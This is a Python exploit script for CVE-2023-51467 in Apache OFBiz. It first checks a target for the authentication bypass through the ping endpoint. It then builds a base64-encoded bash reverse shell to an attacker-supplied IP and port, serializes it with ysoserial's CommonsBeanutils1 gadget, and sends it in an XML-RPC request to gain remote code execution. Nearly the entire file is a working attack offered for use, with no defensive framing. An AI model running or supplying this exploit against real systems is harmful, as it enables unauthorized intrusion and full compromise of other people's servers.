import requests
import sys
import urllib3
import argparse
from urllib.parse import urlparse
import base64
import os
import subprocess

#Suppressing warnings related to insecure web requests in Python
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def ascii():
    art = print("""   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
""")
    return art
    		
def scan(clean_url):
    try:
        #Forming a request to ping and check if PONG is returned in the response
        pingCheckUrl = f"{clean_url}/webtools/control/ping;/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        print("Scanning...")
        response = requests.get(pingCheckUrl, verify=False)
	
        if response.status_code == 200:
            ping_response = requests.get(pingCheckUrl, timeout=7, verify=False)
            if "PONG" in ping_response.text:
                print("Target is vulnerable!!\n")
			
                #Getting the user input to exploit or not
                getUserChoice = input("Do you want to exploit this and pop a shell? (Y)es or (N)o \n") 
                if getUserChoice.lower() in ["y", "yes"]:
                    exploit(clean_url)
                else:
                    sys.exit("Exiting..")
            else:
               print("Target is not vulnerable :(")

    except Exception as e:
        print(e)

def exploit(url):
    try:
        attackerIp = input("Enter your IP: ")
        attackerPort = input("Enter the listening port: ")
        
        #Base64 encoding the bash reverse shell payload
        revShell = f"bash -i >& /dev/tcp/{attackerIp}/{attackerPort} 0>&1"
        revShellBytes = revShell.encode('utf-8')
        base64EncodedRevShellPayload = base64.b64encode(revShellBytes).decode()
        
        #Checking if ysoserial-all.jar exists in the current directory before serialization
        print("Checking if ysoserial-all.jar exists in the current directory....\n")
        
        current_directory = os.getcwd()
        YsoserialFileName = "ysoserial-all.jar"
        YsoserialFile_path = os.path.join(current_directory, YsoserialFileName)
        
        if os.path.exists(YsoserialFile_path) == False:
            sys.exit("Please place the ysoserial-all.jar file in the current directory..")
        else:
            print("Serializing the payload\n")
    	    
    	    #Serializing the payload with ysoserial-all.jar
          
            commandToRun = f"""java -jar ysoserial-all.jar CommonsBeanutils1 'bash -c {{echo,{base64EncodedRevShellPayload}}}|{{base64,-d}}|{{bash,-i}}' """
            result = subprocess.run(commandToRun, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=False)
            #Base64 encoding the serialized payload and removing any new lines that would mess with the payload execution
            FinalEncoded = base64.b64encode(result.stdout).decode().replace("\n","") 
            
            #Constructing the malicious request body
            vulnURL = f"{url}/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
            xmlPostBodyData = f"""<?xml version="1.0"?>
            <methodCall>
              <methodName>Methodname</methodName>
              <params>
                <param>
                  <value>
                    <struct>
                      <member>
                        <name>test</name>
                        <value>
                          <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{FinalEncoded}</serializable>
                        </value>
                      </member>
                    </struct>
                  </value>
                </param>
              </params>
            </methodCall>"""
            
            #Sending the malicious request
            sendPayload = requests.get(vulnURL, data=xmlPostBodyData, timeout=4, verify=False)
            sys.exit("Exploit completed. Enjoy ^^ ")
            
    except Exception as e:
        print(e)
    			
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 scan_cve-2023-51467.py <url>")
    else:
        ascii()
        #Parsing the supplied url and removing trailing slashes ('/') from the end of the URL
        parser = argparse.ArgumentParser(description="URL Parser")
        parser.add_argument("url", help="The URL to parse")
        args = parser.parse_args()

        extractURL = args.url.rstrip('/')
        
        #Parsing and checking if http or https scheme is used in the beginning when the user inputs the target url
        parsedUrl = urlparse(extractURL)
        
        #If the URL is found to be free of errors, passing it to the scan function
        if parsedUrl.scheme in {"https", "http"}:
            scan(extractURL)
        else:
            print("Use http or https in the beginning of the target URL...")

if __name__ == "__main__":
    main()
